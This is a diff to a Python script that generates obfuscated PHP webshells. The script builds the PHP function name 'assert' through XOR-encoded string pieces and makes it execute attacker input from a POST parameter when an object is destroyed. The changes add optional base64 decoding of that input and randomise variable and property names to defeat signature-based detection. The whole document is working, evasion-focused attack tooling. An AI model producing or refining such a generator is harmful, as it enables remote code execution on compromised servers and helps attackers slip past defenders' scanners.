@@ -2,10 +2,9 @@ import random
 
 func = 'assert'
 shell = '''<?php 
-header('HTTP/1.1 404');
 class  {0}{2}
 ${1}=new {0}();
-@${1}->c=$_POST['mr6'];
+@${1}->ccc=isset($_GET['id'])?base64_decode($_POST['mr6']):$_POST['mr6'];
 ?>'''
 
 def random_keys(len):
@@ -23,21 +22,25 @@ def xor(c1,c2):
 
 def build_func():
     func_line = ''
+    name_tmp=[]
+    for i in range(len(func)):
+        name_tmp.append(random_name(3).lower())
     key = random_keys(len(func))
-    call = '$db='
+    fina=random_name(4)
+    call = '${0}='.format(fina)
     for i in range(0,len(func)):
         enc = xor(func[i],key[i])
-        func_line += "$_%d='%s'^\"%s\";" % (i,key[i],enc)
+        func_line += "${0}='{1}'^\"{2}\";".format(name_tmp[i],key[i],enc)
         func_line += '\n'
-        call += '$_%d.' % i
+        call += '${0}.'.format(name_tmp[i])
     func_line = func_line.rstrip('\n')
+    #print(func_line)
     call = call.rstrip('.') + ';'
     func_tmpl = '''{ 
-public $c='';
 function __destruct(){
 %s
 %s
-return @$db ($this->c);}}''' % (func_line,call)
+return @$%s($this->ccc);}}''' % (func_line,call,fina)
     return func_tmpl
 
     
@@ -45,7 +48,7 @@ def build_webshell():
     className = random_name(4)
     objName = className.lower()
     func = build_func()
-    shellc = shell.format(className,objName,func)
+    shellc = shell.format(className,objName,func).replace('ccc',random_name(2))
     return shellc
     
 if __name__ == '__main__':
